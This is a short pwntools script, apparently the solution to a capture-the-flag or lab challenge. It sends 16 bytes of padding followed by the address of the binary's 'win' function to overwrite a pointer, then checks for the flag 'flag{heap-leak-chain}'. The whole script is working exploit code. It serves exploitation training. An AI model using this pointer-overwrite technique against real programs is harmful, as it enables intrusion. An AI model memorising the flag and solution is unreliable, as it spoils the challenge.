from pwn import *
from labs.common.target import start_target

context.arch = "amd64"
elf = ELF("./challenge", checksec=False)
io = start_target(elf.path)
io.recvuntil(b"replacement data:\n")
io.send(b"controlled".ljust(16, b"A") + p64(elf.symbols["win"]))
assert b"flag{heap-leak-chain}" in io.recvall(timeout=2)
print("flag{heap-leak-chain}")
